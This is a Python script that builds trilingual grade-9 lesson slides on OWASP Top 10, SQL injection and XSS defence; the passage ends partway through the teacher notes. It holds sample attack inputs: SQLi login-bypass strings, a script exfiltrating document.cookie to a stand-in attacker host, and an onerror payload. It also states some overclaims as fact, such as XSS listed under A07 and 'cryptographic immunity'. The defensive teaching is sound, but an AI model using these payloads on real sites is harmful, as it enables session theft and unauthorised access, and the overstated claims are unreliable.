# -*- coding: utf-8 -*-
"""9-sinf · 5-hafta · 23-dars — Veb Zaifliklari va OWASP Top 10: SQL Injection va XSS Hujumlaridan Himoyalanish."""

import sys, pathlib
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
from build import (Lesson, slide, title_slide, box, code, el, i18n,
                   sheet_header, mission, table, sheet_box, rubric, writelines, sign_box)

D = "classes/9-sinf/5-hafta/23-dars-veb-zaifliklari-va-owasp-top-10"

TITLES = {
    "uz": "23-dars: Veb Zaifliklari va OWASP Top 10 — SQL Injection & XSS",
    "ru": "Урок 23: Веб-Уязвимости и OWASP Top 10 — SQL Injection & XSS",
    "en": "Lesson 23: Web Vulnerabilities & OWASP Top 10 — SQLi & XSS Defense",
}
SHEET_TITLES = {k: v + (" — Ish Varaqasi" if k == "uz" else
                        " — Рабочий Лист" if k == "ru" else " — Worksheet")
                for k, v in TITLES.items()}

S = []

# 1. Title Slide
S.append(title_slide(
    ph=("Kirish", "Введение", "Intro"), time="0–3",
    eyebrow=("CyberSecurity · 23-dars · 9-sinf (Application Security Track)",
             "CyberSecurity · Урок 23 · 9 класс (Application Security Track)",
             "CyberSecurity · Lesson 23 · Grade 9 (Application Security Track)"),
    h1=("Veb Zaifliklari va OWASP Top 10: SQLi & XSS",
        "Веб-Уязвимости и OWASP Top 10: SQLi & XSS",
        "Web Security & OWASP Top 10: SQLi & XSS Defense"),
    lede=("Dunyo bo'ylab har kuni minglab veb-saytlar murakkab qurollar bilan emas, balki qidiruv satriga yoki login formasiga "
          "kiritilgan <b>bitta qo'shtirnoq belgisi (')</b> yoki kichik <b>JavaScript tegi</b> bilan butunlay buziladi. "
          "Bu xatolar global <b>OWASP Top 10</b> xalqaro reytingida yetakchilik qiladi. "
          "Bugungi darsda siz <b>SQL Injection</b> va <b>Cross-Site Scripting (XSS)</b> qanday ishlashini, "
          "xakerlar qanday qilib butun ma'lumotlar bazasini o'g'irlashini va professional dasturchilar buni "
          "<b>parametrlangan so'rovlar (Prepared Statements)</b> va <b>sanitizatsiya</b> orqali qanday to'xtatishini o'rganasiz.",
          "Тысячи сайтов взламываются ежедневно не суперкомпьютерами, а <b>одинарной кавычкой (')</b> в поле логина "
          "или вредоносным тегом JavaScript, внедрённым в комментарии. Эти уязвимости возглавляют мировой рейтинг <b>OWASP Top 10</b>. "
          "Сегодня вы разберёте анатомию <b>SQL-инъекций (SQLi)</b> и <b>XSS (межсайтового скриптинга)</b>, "
          "увидите кражу баз данных изнутри и научитесь блокировать их с помощью <b>параметризованных запросов</b> и <b>санитизации</b>.",
          "Thousands of web applications fall daily not to supercomputers, but to a <b>single stray apostrophe (')</b> in a login field "
          "or an unescaped script tag in a comments form. These flaws dominate the international <b>OWASP Top 10</b> standard. "
          "Today you will master the mechanics of <b>SQL Injection (SQLi)</b> and <b>Cross-Site Scripting (XSS)</b>, "
          "analyze database exfiltration vectors, and implement bulletproof mitigations using <b>Prepared Statements</b> and <b>context-aware sanitization</b>."),
    meta=[("<b>Fan:</b> Kiberxavfsizlik · Web Application Defense",
           "<b>Предмет:</b> Кибербезопасность · Безопасность Веб-Приложений",
           "<b>Subject:</b> CyberSecurity · Web Application Defense"),
          ("<b>Kohorta:</b> 9-sinf Kiber-Muhandis",
           "<b>Когорта:</b> 9 класс Кибер-Инженер",
           "<b>Cohort:</b> Grade 9 Cyber-Engineer"),
          ("<b>Hafta:</b> 5 (3-soat)", "<b>Неделя:</b> 5 (3-й час)", "<b>Week:</b> 5 (Hour 3)")],
))

# 2. What is OWASP Top 10?
S.append(slide(
    ph=("Standart", "Стандарт", "Industry Standard"), time="3–6",
    eyebrow=("Global xavfsizlik standarti", "Мировой стандарт безопасности", "Global Security Benchmark"),
    title=("OWASP Top 10: Xalqaro Veb-Xavflar Reytingi",
           "OWASP Top 10: Международный Рейтинг Веб-Угроз",
           "OWASP Top 10: The Definitive Application Risk Standard"),
    body='<div class="cols c3">\n'
         + box("accent", ("A01: Kirish Huquqlari Buzilishi (Broken Access)", "A01: Нарушение Контроля Доступа", "A01: Broken Access Control"),
               p=("Foydalanuvchi URL dagi <code>/profile?id=5</code> ni <code>id=6</code> ga o'zgartirib, begonaning shaxsiy ma'lumotlarini ko'ra olishi.",
                  "Подмена ID в URL `id=5` на `id=6` позволяет просматривать чужие профили без авторизации.",
                  "Manipulating object references (e.g. `id=5` to `id=6`) to access unauthorized private records."))
         + box("accent", ("A03: Injection (SQL & Buyruq Hujumlari)", "A03: Инъекции (SQL Injection)", "A03: Injection Attacks (SQLi)"),
               p=("Foydalanuvchi kiritgan ma'lumot to'g'ridan-to'g'ri ma'lumotlar bazasi yoki tizim buyrug'i sifatida bajarilib ketishi.",
                  "Введённые пользователем данные непреднамеренно исполняются сервером как часть кода или SQL-запроса.",
                  "Untrusted user input is directly executed by backend database interpreters or shell engines."))
         + box("purple", ("A07: Identifikatsiya Xatolari (XSS & Auth)", "A07: Сбои Аутентификации (XSS & Auth)", "A07: Identification & Auth Failures"),
               p=("Zaif parollar, sessiyalarni o'g'irlash (Session Hijacking) va brauzerda begonaning scriptlarini bajarish (XSS).",
                  "Слабые сессии, кража cookie через XSS и отсутствие надёжной многофакторной защиты.",
                  "Session token hijacking, missing rate limits, and unescaped Cross-Site Scripting."))
         + '\n</div>'
))

# 3. SQL Injection Mechanics
S.append(slide(
    ph=("SQL Hujumi", "SQL-Инъекция", "SQL Injection"), time="6–10",
    eyebrow=("Qanday qilib 1 ta belgi buzadi?", "Как 1 символ ломает систему?", "How 1 Character Breaks Logic"),
    title=("SQL Injection Anatomiyasi: 1 Qo'shtirnoq Qudrati",
           "Анатомия SQL-Инъекции: Сила Одной Кавычки",
           "Anatomy of SQL Injection: The Destructive Power of a Quote"),
    body='<div class="cols c2">\n'
         + box("accent", ("Zaif Kod (String Concatenation)", "Уязвимый Код (Конкатенация)", "Vulnerable Query Concatenation"),
               items=[
                   ("Dasturchi foydalanuvchi kiritgan matnni to'g'ridan-to'g'ri SQL so'roviga ulaydi:",
                    "Разработчик склеивает строки запроса напрямую с пользовательским вводом:",
                    "Backend naively concatenates user input directly into SQL strings:"),
                   ("<code>SELECT * FROM users WHERE user = '" + "' + username + '" + "' AND pass = '" + "' + pass;</code>",
                    "<code>SELECT * FROM users WHERE user = '" + "' + username + '" + "' AND pass = '" + "' + pass;</code>",
                    "<code>SELECT * FROM users WHERE user = '" + "' + username + '" + "' AND pass = '" + "' + pass;</code>"),
                   ("Agar xaker <code>admin' --</code> kiritsa, parol qismi shundoq izohga (comment) aylanib o'chadi!",
                    "Если ввести <code>admin' --</code>, проверка пароля отсекается символом комментария!",
                    "Inputting <code>admin' --</code> comments out the entire password verification clause!"),
               ])
         + '<div class="box green">\n'
         + el("h3", "Xakerning Exploit Matni", "Пейлоад Злоумышленника", "Attacker Exploit Payload")
         + code("""# Login maydoniga kiritiladi:
admin' OR '1'='1' --

# Serverda hosil bo'ladigan yakuniy SQL:
SELECT * FROM users 
WHERE username = 'admin' OR '1'='1' --' AND pass = '***';

# Natija: '1'='1' har doim TRUE! 
# Parol so'ramasdan Admin bo'lib tizimga kirdi!""")
         + '</div>\n</div>'
))

# 4. The Solution: Prepared Statements
S.append(slide(
    ph=("Yechim: SQLi", "Защита: SQLi", "SQLi Remediation"), time="10–14",
    eyebrow=("Yagona to'g'ri yechim", "Единственное верное решение", "The Definitive Fix"),
    title=("Parametrlangan So'rovlar (Prepared Statements): 100% Himoya",
           "Параметризованные Запросы: 100% Защита от Инъекций",
           "Prepared Statements: Complete Cryptographic Immunity"),
    body='<div class="cols c2">\n'
         + box("", ("Nega Bu Ishlaydi?", "Почему Это Работает?", "Why Parameterization Works"),
               items=[
                   ("<b>Kodni ma'lumotdan ajratish:</b> SQL so'rovi avval kompilyatsiya qilinadi. Uning mantiqiy strukturasi muzlaydi.",
                    "<b>Разделение кода и данных:</b> Структура SQL компилируется заранее до получения данных.",
                    "<b>Separation of code & data:</b> Query structure compiles in DB engine before data arrives."),
                   ("<b>Hech qanday qo'shtirnoq buzolmaydi:</b> Foydalanuvchi kiritgan har qanday belgi faqat oddiy matn (literal) deb o'qiladi.",
                    "<b>Кавычки теряют силу:</b> Любые символы трактуются исключительно как сырой текст.",
                    "<b>Apostrophes lose syntax power:</b> Input is strictly parsed as inert string literals."),
                   ("<b>Tezlik va xavfsizlik:</b> Ma'lumotlar bazasi so'rov rejasini keshlash orqali tezroq ishlaydi.",
                    "<b>Скорость и защита:</b> База данных кэширует план выполнения запроса.",
                    "<b>Optimized & bulletproof:</b> Query plan is cached while vulnerabilities become mathematically impossible."),
               ])
         + '<div class="box accent">\n'
         + el("h3", "To'g'ri va Xavfsiz Kod Namunasi (Node.js & PostgreSQL)", "Безопасный Код (Node.js)", "Secure Prepared Statement Code")
         + code("""// ❌ XAVFLI: Hech qachon bunday qilmang!
const query = `SELECT * FROM users WHERE login = '${login}'`;

// ✅ XAVFSIZ: Parametrlangan so'rov ($1, $2)
const safeQuery = 'SELECT * FROM users WHERE login = $1 AND pass = $2';
const result = await db.query(safeQuery, [login, password]);

// Foydalanuvchi "admin' OR 1=1" kiritsa ham, 
// baza uni shunday ismli odam qidiradi va 0 ta topadi!""")
         + '</div>\n</div>'
))

# 5. Cross-Site Scripting (XSS)
S.append(slide(
    ph=("XSS Hujumi", "XSS-Атака", "Cross-Site Scripting"), time="14–18",
    eyebrow=("Brauzerni egallash", "Захват браузера жертвы", "Browser Hijacking"),
    title=("Cross-Site Scripting (XSS): Qanday Qilib Cookie O'g'irlanadi?",
           "Cross-Site Scripting (XSS): Как Крадут Чужие Сессии?",
           "Cross-Site Scripting (XSS): Cookie Theft in the Client Context"),
    body='<div class="cols c2">\n'
         + box("accent", ("XSS Qanday Sodir Bo'ladi?", "Как Происходит XSS?", "XSS Exploitation Vector"),
               items=[
                   ("Saytda foydalanuvchilar fikr (izoh) qoldiradigan maydon bor.",
                    "На сайте есть форма комментариев, форума или профиля.",
                    "Application accepts user comments, profile bios, or search queries."),
                   ("Hujumchi oddiy matn o'rniga JavaScript kodi kiritadi:",
                    "Злоумышленник оставляет вредоносный тег JavaScript вместо текста:",
                    "Adversary injects raw JavaScript script tags:"),
                   ("<code>&lt;script&gt;fetch('https://xaker.uz/log?c='+document.cookie)&lt;/script&gt;</code>",
                    "<code>&lt;script&gt;fetch('https://xaker.uz/log?c='+document.cookie)&lt;/script&gt;</code>",
                    "<code>&lt;script&gt;fetch('https://xaker.uz/log?c='+document.cookie)&lt;/script&gt;</code>"),
                   ("Boshqa foydalanuvchi sahifani ochganda, uning brauzerida bu script ishlab ketadi va uning <b>sessiya tokeni (cookie)</b> xakerga uchib ketadi!",
                    "Когда другой юзер открывает страницу, скрипт исполняется в его браузере и крадёт сессионные куки!",
                    "When another user visits, the browser executes the script, instantly exfiltrating their session cookie!"),
               ])
         + '<div class="box purple">\n'
         + el("h3", "XSS Turlari", "Виды XSS-Атак", "XSS Classifications")
         + code("""1. Stored XSS (Doimiy):
Zararli script Ma'lumotlar bazasida saqlanadi. 
Sahifani ochgan har bir odam zararlanadi (Eng xavflisi!).

2. Reflected XSS (Aks etuvchi):
Script URL parametrida keladi:
https://sayt.uz/search?q=<script>alert(1)</script>
Faqat havola ustiga bosgan odamga ta'sir qiladi.

3. DOM XSS:
Mijoz tomonidagi JavaScript xatosi tufayli yuzaga keladi.""")
         + '</div>\n</div>'
))

# 6. XSS Defense & Sanitization
S.append(slide(
    ph=("Yechim: XSS", "Защита: XSS", "XSS Remediation"), time="18–22",
    eyebrow=("Qat'iy sanitizatsiya", "Строгая фильтрация", "Sanitization & Defense-in-Depth"),
    title=("XSS Mudofaasi: HTML Encoding, CSP va HttpOnly Cookie",
           "Защита от XSS: Экранирование, CSP и HttpOnly",
           "Defeating XSS: Contextual Encoding, CSP & HttpOnly Flags"),
    body='<div class="cols c3">\n'
         + box("green", ("1. HTML Entity Encoding", "1. Экранирование HTML", "1. HTML Entity Encoding"),
               p=("Maxsus belgilarni zararsiz kodlarga aylantirish: <code>&lt;</code> -> <code>&amp;lt;</code>, <code>&gt;</code> -> <code>&amp;gt;</code>. Brauzer uni kod emas, rasmdek ko'rsatadi.",
                  "Преобразование символов в безопасные HTML-сущности (`<` в `&lt;`). Браузер рисует текст, но не выполняет код.",
                  "Convert dangerous characters into inert HTML entities (`<` becomes `&lt;`). Browser renders glyphs without executing scripts."))
         + box("purple", ("2. HttpOnly Cookie Flagi", "2. Флаг Cookie HttpOnly", "2. HttpOnly Cookie Flag"),
               p=("Eng muhim kiber-himoya! Agar Cookie <code>HttpOnly</code> bilan belgilansa, <b>hech qanday JavaScript (hatto XSS ham)</b> uni o'qiy olmaydi!",
                  "Куки с флагом `HttpOnly` физически недоступны для JavaScript (`document.cookie`), блокируя кражу сессий.",
                  "Cookies marked `HttpOnly` are strictly inaccessible to JavaScript via `document.cookie`, defeating session exfiltration."))
         + box("accent", ("3. Content Security Policy (CSP)", "3. Политика CSP", "3. Content Security Policy (CSP)"),
               p=("Server brauzerga qat'iy qoida yuboradi: <i>\"Faqat mening domenimdagi scriptlarni ishlat, begona scriptlarni blokla!\"</i>",
                  "Заголовок CSP указывает браузеру загружать скрипты только из доверенных белых списков.",
                  "HTTP response header restricting script execution strictly to whitelisted origin domains."))
         + '\n</div>'
))

# 7. Vulnerability Scanner & Live Exploit
S.append(slide(
    ph=("Laboratoriya", "Демонстрация", "Live Inspection"), time="22–26",
    eyebrow=("Kiber-laboratoriya", "Инспекция уязвимостей", "Vulnerability Inspection"),
    title=("Jonli Tahlil: Buzilgan Qidiruv vs Himoyalangan API",
           "Живой Анализ: Дырявый Поиск против Защищённого API",
           "Live Forensics: Exploiting Vulnerable Form vs Hardened API"),
    body='<div class="cols c2">\n'
         + box("accent", ("Buzilgan Veb-Ilova (Vulnerable Endpoint)", "Уязвимый Эндпоинт", "Vulnerable Search Endpoint"),
               items=[
                   ("Foydalanuvchi kiritgan so'z to'g'ridan-to'g'ri HTML ga yoziladi:",
                    "Ввод выводится в HTML через `innerHTML` без экранирования:",
                    "Input directly assigned to DOM via `innerHTML`:"),
                   ("<code>document.getElementById('result').innerHTML = 'Siz qidirdingiz: ' + input;</code>",
                    "<code>document.getElementById('result').innerHTML = 'Вы искали: ' + input;</code>",
                    "<code>document.getElementById('result').innerHTML = 'Searched: ' + input;</code>"),
                   ("Hujumchi <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code> kiritsa, darhol o'g'irlik yuz beradi!",
                    "Пейлоад с ошибочной картинкой немедленно запускает кражу cookie!",
                    "Malicious image tag with onerror event triggers immediate script execution!"),
               ])
         + '<div class="box green">\n'
         + el("h3", "Himoyalangan Zamonaviy Kod", "Защищённый Код", "Hardened Sanitized Implementation")
         + code("""// ✅ 1. DOMPurify yoki textContent ishlatish:
document.getElementById('result').textContent = 'Siz qidirdingiz: ' + input;

// ✅ 2. Xavfsiz Cookie yozish (Backend):
res.cookie('session_id', token, {
    httpOnly: true, // XSS o'g'irlay olmaydi!
    secure: true,   // Faqat HTTPS orqali
    sameSite: 'strict' // CSRF hujumlarini to'xtatadi
});""")
         + '</div>\n</div>'
))

# 8. Real-World Case Study
S.append(slide(
    ph=("Real Keys", "Кейс из Жизни", "Case Study"), time="26–30",
    eyebrow=("77 million dollarlik xato", "Убыток в $77 миллионов", "The $77M Breach"),
    title=("TalkTalk Kiber-Halokati: Oddiy SQLi Qanday Qilib Kompaniyani Yiqitdi",
           "Крах TalkTalk: Как Простейшая SQL-Инъекция Стоила $77 Млн",
           "The TalkTalk Catastrophe: How Elementary SQLi Cost $77 Million"),
    body='<div class="cols c2">\n'
         + box("accent", ("Hujum Xronologiyasi", "Хронология Взлома", "Breach Chronology"),
               p=("2015-yilda 15 yoshli o'smir Buyuk Britaniyaning eng yirik telekom operatorlaridan biri <b>TalkTalk</b> saytidagi eski meros sahifada oddiy SQL Injection zaifligini topdi. U avtomatlashgan <code>sqlmap</code> vositasi yordamida bir necha soat ichida butun ma'lumotlar bazasini ko'chirib oldi.",
                  "В 2015 году 15-летний подросток обнаружил простейшую SQL-инъекцию на заброшенной странице телеком-гиганта TalkTalk. С помощью утилиты sqlmap за пару часов была скачана вся база клиентов.",
                  "In 2015, a 15-year-old schoolboy identified a legacy SQL injection vulnerability on British telecom giant TalkTalk's web portal. Using automated sqlmap scripts, he exfiltrated the entire database within hours."))
         + box("purple", ("Falokat Oqibatlari", "Последствия Катастрофы", "Catastrophic Fallout"),
               items=[
                   ("<b>156 959 ta mijoz:</b> Ularning ism-shariflari, manzillari va bank hisob raqamlari o'g'irlandi.",
                    "<b>156 959 клиентов:</b> Украдены банковские реквизиты, телефоны и персональные данные.",
                    "<b>156,959 customers:</b> Bank account numbers, sort codes, and PII stolen."),
                   ("<b>77 000 000 dollar:</b> Kompaniyaga jarimalar va yo'qotilgan mijozlar tufayli 77 million dollar ziyon yetdi.",
                    "<b>$77 000 000:</b> Убытки от штрафов регуляторов и оттока 100 000 клиентов.",
                    "<b>$77,000,000 loss:</b> Regulatory fines, brand devastation, and over 100,000 canceled accounts."),
                   ("<b>Sabab:</b> Bitta eski PHP sahifadagi <code>$id = $_GET['id']</code> so'rovi parametrlanmagan edi!",
                    "<b>Причина:</b> Всего один незащищённый параметр в старом скрипте PHP без подготовленных запросов!",
                    "<b>Root Cause:</b> A single legacy PHP endpoint concatenating `$_GET['id']` without prepared statements!"),
               ])
         + '\n</div>'
))

# 9. Practical Mission (12 min timer)
S.append(slide(
    ph=("Amaliyot", "Практика", "Hands-On Lab"), time="30–42",
    eyebrow=("Mustaqil laboratoriya · 12 daqiqa", "Лабораторная работа · 12 минут", "Practical Lab · 12 Minutes"),
    title=("Amaliy Topshiriq: Zaif Ilovani Sinash va Himoyalash",
           "Практическое Задание: Взлом и Защита Веб-Приложения",
           "Mission: Vulnerability Exploitation & Remediation"),
    body='<div class="cols c2">\n'
         + box("green", ("Laboratoriya Bosqichlari", "Шаги Лабораторной", "Mission Checkpoints"),
               items=[
                   ("<b>1. SQL Injection sinovi:</b> Qidiruv formasi orqali <code>' OR '1'='1</code> kiritib, barcha yashirin yozuvlarni chiqaring.",
                    "<b>1. Тест SQLi:</b> Введите `' OR '1'='1` в форму поиска и извлеките скрытые строки.",
                    "<b>1. Exploit SQLi:</b> Inject `' OR '1'='1` into the search form to bypass filters."),
                   ("<b>2. XSS exploitini sinash:</b> Izoh maydoniga <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> kiritib ko'ring.",
                    "<b>2. Тест XSS:</b> Внедрите скрипт во всплывающее окно в поле ввода комментария.",
                    "<b>2. Test XSS:</b> Inject an alert payload into the comment submission field."),
                   ("<b>3. SQLi ni tuzatish:</b> So'rovni <code>db.query(sql, [params])</code> parametrlangan formatga o'tkazing.",
                    "<b>3. Исправление SQLi:</b> Перепишите запрос на безопасный параметризованный вызов.",
                    "<b>3. Patch SQLi:</b> Refactor database execution to use prepared parameterized queries."),
                   ("<b>4. XSS ni tuzatish:</b> <code>innerHTML</code> ni <code>textContent</code> ga almashtiring va HttpOnly yoqing.",
                    "<b>4. Исправление XSS:</b> Замените `innerHTML` на `textContent` и включите HttpOnly.",
                    "<b>4. Patch XSS:</b> Enforce `textContent` encoding and configure HttpOnly cookie flags."),
               ])
         + box("accent", ("O'lchanadigan Natija", "Критерий Сдачи", "Deliverable Spec"),
               p=("Tuzatilgan kodda <code>' OR 1=1</code> kiritilganda baza buzilmasligi (0 ta natija) va <code>&lt;script&gt;</code> kiritilganda kod ishlamasdan, oddiy matn sifatida xavfsiz aks etishi shart!",
                  "После исправления ввод `' OR 1=1` не ломает поиск (0 результатов), а тег `<script>` выводится как сырой текст без выполнения!",
                  "After remediation, `' OR 1=1` returns zero records without syntax errors, and `<script>` renders as harmless plaintext without execution!"))
         + '\n</div>'
))

# 10. Verification Checklist
S.append(slide(
    ph=("Tekshirish", "Чек-лист", "Verification"), time="42–43",
    eyebrow=("Xavfsizlik tekshiruvi", "Проверка защиты", "Security Audit"),
    title=("Nazorat Cheklisti: Zaifliklar Yopildimi?",
           "Чек-лист Аудита: Закрыты ли Дыры?",
           "Security Audit Checklist: Zero Exploit Verification"),
    body='<div class="cols c3">\n'
         + box("", ("1. Parameterized Query", "1. Параметризация", "1. Parameterization"),
               p=("Kodda bitta ham qator qo'shish (string concatenation `+`) qolmadimi?",
                  "Удалена ли вся небезопасная конкатенация строк в SQL-запросах?",
                  "Is all string concatenation eliminated from database queries?"))
         + box("", ("2. textContent Ishlatildimi?", "2. textContent Применён?", "2. textContent Used?"),
               p=("DOM ga kiritishda xavfli `innerHTML` o'rniga `textContent` qo'yildimi?",
                  "Заменён ли опасный `innerHTML` на безопасный `textContent`?",
                  "Is unsafe `innerHTML` completely replaced with `textContent`?"))
         + box("", ("3. HttpOnly Flag", "3. Флаг HttpOnly", "3. HttpOnly Flag"),
               p=("Cookie sozlamasida `httpOnly: true` flagi mavjudmi?",
                  "Присутствует ли `httpOnly: true` при установке cookie сессии?",
                  "Is `httpOnly: true` strictly enforced on session cookies?"))
         + '\n</div>'
))

# 11. Rubric (10-Ball)
S.append(slide(
    ph=("Mezon", "Критерии", "Evaluation"), time="43–44",
    eyebrow=("10 ballik mezon", "10-балльная шкала", "10-Point Rubric"),
    title=("Darsni Baholash Mezonlari (10 Ball)",
           "Критерии Оценки за Урок (10 Баллов)",
           "Lesson Evaluation Rubric (10 Points)"),
    body='<div class="cols c3">\n'
         + box("green", ("A'lo (9–10 Ball)", "Отлично (9–10)", "Exemplary (9–10)"),
               items=[
                   ("SQL Injection va XSS mexanikasi to'liq tushuntirilgan.", "Механика SQLi и XSS объяснена на 100%.", "SQLi & XSS mechanics flawlessly explained."),
                   ("Prepared Statements kodi xatosiz yozilgan.", "Код параметризованных запросов без ошибок.", "Prepared Statements code written without syntax flaws."),
                   ("XSS sanitizatsiya va HttpOnly to'liq yoqilgan.", "Санитизация XSS и флаг HttpOnly внедрены.", "XSS sanitization & HttpOnly flags fully active."),
                   ("Varaqa 100% to'ldirilgan.", "Рабочий лист заполнен на 100%.", "Worksheet completed 100%."),
               ])
         + box("", ("Yaxshi (7–8 Ball)", "Хорошо (7–8)", "Proficient (7–8)"),
               items=[
                   ("SQLi tuzatilgan, lekin XSS da qisman xato bor.", "SQLi исправлена, но в защите XSS есть недочёты.", "SQLi patched, but XSS sanitization has minor flaws."),
                   ("Prepared Statement ishlash prinsipi to'g'ri.", "Принцип работы подготовленных запросов верен.", "Prepared Statements concept correct."),
                   ("Varaqa 80% to'ldirilgan.", "Лист заполнен на 80%.", "Worksheet completed 80%."),
               ])
         + box("accent", ("Qoniqarli (5–6 Ball)", "Удовл. (5–6)", "Developing (5–6)"),
               items=[
                   ("Faqat zaiflik sinab ko'rilgan, tuzatilmagan.", "Уязвимости найдены, но код не исправлен.", "Exploits tested, but remediation unapplied."),
                   ("Nazariy tushunchalarda chalkashlik bor.", "Путаница в понятиях SQLi и XSS.", "Confusion between client vs backend attacks."),
                   ("Varaqa to'liq emas.", "Лист заполнен частично.", "Worksheet incomplete."),
               ])
         + '\n</div>'
))

# 12. Summary & Homework
S.append(slide(
    ph=("Xulosa", "Итоги", "Summary"), time="44–45",
    eyebrow=("Uyga vazifa", "Домашнее задание", "Homework & Next Steps"),
    title=("Xulosa va Uy Vazifasi: Xavfsiz Veb-Kodlash",
           "Итоги и Домашнее Задание: Безопасный Кодинг",
           "Summary & Homework: Writing Resilient Web Applications"),
    body='<div class="cols c2">\n'
         + box("purple", ("Dars Xulosasi", "Итоги Урока", "Core Summary"),
               p=("Foydalanuvchi kiritgan har qanday ma'lumot — dushman deb qaralishi shart (Never Trust User Input). Ma'lumotlar bazasi bilan faqat Prepared Statements orqali muloqot qiling, HTML ga chiqarishda esa har doim sanitizatsiyadan o'tkazing.",
                  "Любой ввод пользователя — потенциально враждебен (Never Trust User Input). Общайтесь с базой только через Prepared Statements, а вывод в HTML экранируйте.",
                  "Golden Rule of Application Security: Never Trust User Input. Always interface with databases via Prepared Statements, and sanitize every dynamic string before DOM rendering."))
         + box("accent", ("Uy Vazifasi (10 Ball)", "Домашнее Задание (10 Баллов)", "Homework Assignment (10 Pts)"),
               items=[
                   ("<b>Amaliy:</b> O'zingiz yozgan avvalgi loyihalaringizdagi (masalan, valyuta konverteri yoki turnir sayti) inputlarni tekshiring: XSS ga zaif emasmi?",
                    "<b>Практика:</b> Проверьте свои предыдущие проекты на уязвимость к XSS.",
                    "<b>Audit:</b> Audit your previous frontend projects for potential XSS flaws."),
                   ("<b>Kod:</b> Node.js da 1 ta login funksiyasini Prepared Statement bilan yozib skrinshotini ilova qiling.",
                    "<b>Код:</b> Напишите функцию логина с параметризованным запросом на Node.js.",
                    "<b>Code:</b> Implement an authenticated query using prepared statements in Node.js."),
                   ("<b>Varaqa:</b> Ish varaqasidagi barcha savollarni to'ldirib topshiring.",
                    "<b>Лист:</b> Заполните и сдайте печатный рабочий лист.",
                    "<b>Submission:</b> Complete and submit your printable lab worksheet."),
               ])
         + '\n</div>'
))

# Teacher Notes
N_UZ = [
    ["Kirish", "Darsni boshlash: Bugun biz veb-dasturlashdagi eng mashhur ikki zaiflik: SQLi va XSS ni o'rganamiz.", "Slaydni oching, bitta qo'shtirnoq butun saytni qanday ag'darishini namoyish qiling."],
    ["Standart", "OWASP Top 10 nima? Dunyo bo'yicha veb-xatarlarning eng nufuzli reytingi.", "A01 va A03 guruhlarini doskaga yozib tushuntiring."],
    ["SQL Hujumi", "SQL Injection qanday ishlashi. Qatorlarni qo'shish (concatenation) xatosi va ' OR '1'='1 mantiqiy nayrangi.", "SQL so'rovini doskada tahlil qiling."],
    ["Yechim: SQLi", "Prepared Statements (parametrlangan so'rovlar). Nega qo'shtirnoq bu yerda kuchini yo'qotadi?", "Kod va ma'lumotni ajratish tamoyilini tushuntiring."],
    ["XSS Hujumi", "Cross-Site Scripting nima? Stored va Reflected XSS farqi. Cookie qanday o'g'irlanadi?", "Xaker scripti brauzerda qanday ishlashini ko'rsating."],
    ["Yechim: XSS", "XSS ga qarshi 3 qatlamli himoya: HTML encoding, HttpOnly cookie va CSP.", "HttpOnly flagining ahamiyatini alohida ta'kidlang."],
    ["Laboratoriya", "Jonli tahlil: innerHTML o'rniga textContent ishlatish.", "Ekranda xavfsiz va xavfli kodni solishtirib ko'rsating."],
    ["Real Keys", "TalkTalk voqeasi. 15 yoshli o'smir 77 million dollarlik zararni qanday yetkazgani.", "Real xakerlik oqibatlarini tushuntiring."],
    ["Amaliyot", "12 daqiqalik laboratoriya. O'quvchilar zaif kodni topib, parametrli so'rovga o'tkazadilar.", "Taymerni yoqing (12 daqiqa), o'quvchilarga ko'maklashing."],
    ["Tekshirish", "Nazorat tekshiruvi. Kod to'g'ri sanitizatsiya qilinganini tekshirish.", "O'quvchilar ekranidagi test natijalarini ko'ring."],
    ["Mezon", "10 ballik baholash mezoni tushuntiriladi.", "Talablarni eslatib o'ting."],
    ["Xulosa", "Dars yakuni va uy vazifasi. Kelgusi darsda zamonaviy Autentifikatsiya, JWT va 2FA ni o'rganamiz.", "Varaqalarni yig'ing."]
]

N_RU = [
    ["Введение", "Старт урока: Разбор двух главных веб-уязвимостей — SQL-инъекций и XSS.", "Покажите, как одинарная кавычка ломает логику базы данных."],
    ["Стандарт", "Что такое OWASP Top 10? Международный стандарт безопасности приложений.", "Кратко опишите категории A01, A03, A07."],
    ["SQL-Инъекция", "Механика SQL Injection: конкатенация строк и логическое выражение ' OR '1'='1.", "Разберите уязвимый SQL-запрос на доске."],
    ["Защита: SQLi", "Параметризованные запросы (Prepared Statements). Почему кавычки теряют силу.", "Объясните разделение кода и данных."],
    ["XSS-Атака", "Межсайтовый скриптинг (XSS): Stored и Reflected. Кража сессионных cookie.", "Покажите пейлоад перехвата сессии."],
    ["Защита: XSS", "3 уровня защиты от XSS: экранирование HTML, флаг HttpOnly и заголовки CSP.", "Подчеркните важность флага HttpOnly."],
    ["Демонстрация", "Живой анализ: замена innerHTML на textContent.", "Покажите сравнение безопасного и опасного кода."],
    ["Кейс из Жизни", "Кейс TalkTalk: как школьник нанёс ущерб в $77 млн из-за одной SQL-инъекции.", "Обсудите последствия халатности в разработке."],
    ["Практика", "12 минут практики: взлом учебного эндпоинта и защита параметризацией.", "Запустите таймер, помогайте с синтаксисом Prepared Statements."],
    ["Проверка", "Чек-лист проверки: убедитесь в отсутствии конкатенации в коде.", "Проверьте экраны учащихся."],
    ["Критерии", "10-балльная шкала оценивания практической работы.", "Озвучьте правила начисления баллов."],
    ["Итоги", "Завершение урока и домашнее задание. На следующем уроке изучим JWT, сессии и 2FA.", "Соберите рабочие листы."]
]

N_EN = [
    ["Intro", "Lesson opening: Dissecting the two most notorious web vulnerabilities — SQLi and XSS.", "Demonstrate how a single apostrophe dismantles database logic."],
    ["Industry Standard", "What is OWASP Top 10? The international gold standard of software security.", "Introduce categories A01, A03, A07."],
    ["SQL Injection", "SQL Injection mechanics: String concatenation flaws and boolean tautology exploits.", "Dissect vulnerable query structure on whiteboard."],
    ["SQLi Remediation", "Prepared Statements and parameterization: Enforcing compile-time query structure.", "Explain separation of executable code from inert data."],
    ["Cross-Site Scripting", "Cross-Site Scripting (XSS) taxonomy: Stored vs Reflected and cookie theft vectors.", "Show payload execution in browser console context."],
    ["XSS Remediation", "3-layer defense against XSS: Entity encoding, HttpOnly cookie flags, and CSP headers.", "Emphasize HttpOnly protection against DOM exfiltration."],
    ["Live Inspection", "Live code audit: Refactoring unsafe `innerHTML` into secure `textContent`.", "Walk through defensive DOM scripting in terminal."],
    ["Case Study", "The TalkTalk disaster: How an unpatched SQLi by a teenager triggered $77M in losses.", "Analyze catastrophic business and regulatory consequences."],
